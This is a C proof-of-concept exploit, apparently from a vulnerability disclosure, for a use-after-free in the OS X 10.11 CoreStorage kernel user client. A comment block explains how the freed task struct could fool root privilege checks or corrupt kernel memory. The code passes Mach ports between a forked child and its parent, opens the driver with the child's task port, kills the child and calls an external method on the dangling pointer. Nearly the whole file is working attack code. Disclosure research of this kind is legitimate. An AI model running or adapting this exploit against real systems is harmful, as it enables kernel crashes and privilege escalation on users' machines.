// ianbeer

/*
OS X kernel use-after-free in CoreStorage

CoreStorageUserClient stores a task struct pointer (passed in via IOServiceOpen) in the field at +0xE0 without taking a reference.

By killing the corrisponding task we can free this pointer leaving the user client with a dangling pointer.

Interestingly CoreStorageUserClient will then use this dangling pointer to perform privilege checks using IOUserClient::clientHasPrivilege
so if we could get that free'd task struct reallocated by a root owned process (which would be pretty easy) then we could trick these checks into
believing that we were root. Presumably they do interesting stuff which should be limited to root only like messing with volume information.

You could also leverage this bug for kernel memory corruption.

build: clang -o corestorage_task_uaf  corestorage_task_uaf.c -framework IOKit

You should set gzalloc_min=1024 gzalloc_max=2048 or similar to actually fault on the UaF - otherwise you might see some weird panics!

tested on OS X 10.11.5 (15F34) on MacBookAir5,2
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/stat.h>

#include <libkern/OSAtomic.h>
#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_vm.h>
#include <mach/task.h>
#include <mach/task_special_ports.h>

#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>


#define MACH_ERR(str, err) do { \
  if (err != KERN_SUCCESS) {    \
    mach_error("[-]" str "\n", err); \
    exit(EXIT_FAILURE);         \
  }                             \
} while(0)

#define FAIL(str) do { \
  printf("[-] " str "\n");  \
  exit(EXIT_FAILURE);  \
} while (0)

#define LOG(str) do { \
  printf("[+] " str"\n"); \
} while (0)

/***************
 * port dancer *
 ***************/

// set up a shared mach port pair from a child process back to its parent without using launchd
// based on the idea outlined by Robert Sesek here: https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html

// mach message for sending a port right
typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t port;
} port_msg_send_t;

// mach message for receiving a port right
typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t port;
  mach_msg_trailer_t trailer;
} port_msg_rcv_t;

typedef struct {
  mach_msg_header_t  header;
} simple_msg_send_t;

typedef struct {
  mach_msg_header_t  header;
  mach_msg_trailer_t trailer;
} simple_msg_rcv_t;

#define STOLEN_SPECIAL_PORT TASK_BOOTSTRAP_PORT

// a copy in the parent of the stolen special port such that it can be restored
mach_port_t saved_special_port = MACH_PORT_NULL;

// the shared port right in the parent
mach_port_t shared_port_parent = MACH_PORT_NULL;

void setup_shared_port() {
  kern_return_t err;
  // get a send right to the port we're going to overwrite so that we can both
  // restore it for ourselves and send it to our child
  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &saved_special_port);
  MACH_ERR("saving original special port value", err);

  // allocate the shared port we want our child to have a send right to
  err = mach_port_allocate(mach_task_self(),
                           MACH_PORT_RIGHT_RECEIVE,
                           &shared_port_parent);

  MACH_ERR("allocating shared port", err);

  // insert the send right
  err = mach_port_insert_right(mach_task_self(),
                               shared_port_parent,
                               shared_port_parent,
                               MACH_MSG_TYPE_MAKE_SEND);
  MACH_ERR("inserting MAKE_SEND into shared port", err);

  // stash the port in the STOLEN_SPECIAL_PORT slot such that the send right survives the fork
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, shared_port_parent);
  MACH_ERR("setting special port", err);
}

mach_port_t recover_shared_port_child() {
  kern_return_t err;

  // grab the shared port which our parent stashed somewhere in the special ports
  mach_port_t shared_port_child = MACH_PORT_NULL;
  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &shared_port_child);
  MACH_ERR("child getting stashed port", err);

  LOG("child got stashed port");

  // say hello to our parent and send a reply port so it can send us back the special port to restore

  // allocate a reply port
  mach_port_t reply_port;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
  MACH_ERR("child allocating reply port", err);

  // send the reply port in a hello message
  simple_msg_send_t msg = {0};

  msg.header.msgh_size = sizeof(msg);
  msg.header.msgh_local_port = reply_port;
  msg.header.msgh_remote_port = shared_port_child;

  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);

  err = mach_msg_send(&msg.header);
  MACH_ERR("child sending task port message", err);

  LOG("child sent hello message to parent over shared port");

  // wait for a message on the reply port containing the stolen port to restore
  port_msg_rcv_t stolen_port_msg = {0};
  err = mach_msg(&stolen_port_msg.header, MACH_RCV_MSG, 0, sizeof(stolen_port_msg), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
  MACH_ERR("child receiving stolen port\n", err);

  // extract the port right from the message
  mach_port_t stolen_port_to_restore = stolen_port_msg.port.name;
  if (stolen_port_to_restore == MACH_PORT_NULL) {
    FAIL("child received invalid stolen port to restore");
  }

  // restore the special port for the child
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, stolen_port_to_restore);
  MACH_ERR("child restoring special port", err);

  LOG("child restored stolen port");
  return shared_port_child;
}

mach_port_t recover_shared_port_parent() {
  kern_return_t err;

  // restore the special port for ourselves
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, saved_special_port);
  MACH_ERR("parent restoring special port", err);

  // wait for a message from the child on the shared port
  simple_msg_rcv_t msg = {0};
  err = mach_msg(&msg.header,
                 MACH_RCV_MSG,
                 0,
                 sizeof(msg),
                 shared_port_parent,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  MACH_ERR("parent receiving child hello message", err);

  LOG("parent received hello message from child");

  // send the special port to our child over the hello message's reply port
  port_msg_send_t special_port_msg = {0};

  special_port_msg.header.msgh_size        = sizeof(special_port_msg);
  special_port_msg.header.msgh_local_port  = MACH_PORT_NULL;
  special_port_msg.header.msgh_remote_port = msg.header.msgh_remote_port;
  special_port_msg.header.msgh_bits        = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits), 0) | MACH_MSGH_BITS_COMPLEX;
  special_port_msg.body.msgh_descriptor_count = 1;

  special_port_msg.port.name        = saved_special_port;
  special_port_msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;
  special_port_msg.port.type        = MACH_MSG_PORT_DESCRIPTOR;

  err = mach_msg_send(&special_port_msg.header);
  MACH_ERR("parent sending special port back to child", err);

  return shared_port_parent;
}

/*** end of port dancer code ***/

void do_child(mach_port_t shared_port) {
  kern_return_t err;

  // create a reply port to receive an ack that we should exec the target
  mach_port_t reply_port;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
  MACH_ERR("child allocating reply port", err);

  // send our task port to our parent over the shared port
  port_msg_send_t msg = {0};

  msg.header.msgh_size = sizeof(msg);
  msg.header.msgh_local_port = reply_port;
  msg.header.msgh_remote_port = shared_port;
  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;

  msg.body.msgh_descriptor_count = 1;

  msg.port.name = mach_task_self();
  msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;
  msg.port.type = MACH_MSG_PORT_DESCRIPTOR;

  err = mach_msg_send(&msg.header);
  MACH_ERR("child sending task port message", err);

  LOG("child sent task port back to parent");

  // spin and let our parent kill us
  while(1){;}
}

mach_port_t do_parent(mach_port_t shared_port) {
  kern_return_t err;

  // wait for our child to send us its task port
  port_msg_rcv_t msg = {0};
  err = mach_msg(&msg.header,
                 MACH_RCV_MSG,
                 0,
                 sizeof(msg),
                 shared_port,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  MACH_ERR("parent receiving child task port message", err);

  mach_port_t child_task_port = msg.port.name;
  if (child_task_port == MACH_PORT_NULL) {
    FAIL("invalid child task port");
  }

  LOG("parent received child's task port");

  return child_task_port;
}

io_connect_t get_connection(mach_port_t task_port) {
  kern_return_t err;
  mach_port_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("CoreStorage"));

  if (service == MACH_PORT_NULL) {
    printf("unable to get service\n");
    return MACH_PORT_NULL;
  }

  io_connect_t conn = MACH_PORT_NULL;

  err = IOServiceOpen(service, task_port, 0, &conn);
  if (err != KERN_SUCCESS){
    printf("IOServiceOpen failed: %s\n", mach_error_string(err));
    conn = MACH_PORT_NULL;
  }
  IOObjectRelease(service);

  return conn;   
}

void trigger(int child_pid, mach_port_t child_task_port) {
  kern_return_t err;
  // get the userclient passing the child's task port
  io_connect_t conn = get_connection(child_task_port);
  if (conn == MACH_PORT_NULL){
    printf("unable to get connection\n");
    return;
  }

  printf("got user client\n");

  // drop our ref on the child_task_port
  mach_port_deallocate(mach_task_self(), child_task_port);

  // kill the child, free'ing its task struct
  kill(child_pid, 9);
  int status;
  wait(&status);

  printf("killed child\n");

  // UpdateLogicalVolume

  uint64_t inputScalar[16];
  size_t inputScalarCnt = 0;

  char inputStruct[0x100];
  size_t inputStructCnt = 0x100;

  memset(inputStruct, 'A', 0x100);

  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;

  char outputStruct[4096];
  size_t outputStructCnt = 0x100;

  int selector = 7;

  err = IOConnectCallMethod(
          conn,
          selector,
          inputScalar,
          inputScalarCnt,
          inputStruct,
          inputStructCnt,
          outputScalar,
          &outputScalarCnt,
          outputStruct,
          &outputStructCnt);

  MACH_ERR("making external method call", err);
  
}

int main(int argc, char** argv) {
  setup_shared_port();

  pid_t child_pid = fork();
  if (child_pid == -1) {
    FAIL("forking");
  }

  if (child_pid == 0) {
    mach_port_t shared_port_child = recover_shared_port_child();
    do_child(shared_port_child);
  } else {
    mach_port_t shared_port_parent = recover_shared_port_parent();
    mach_port_t child_task_port = do_parent(shared_port_parent);
    trigger(child_pid, child_task_port);
  }

  return 0;
}
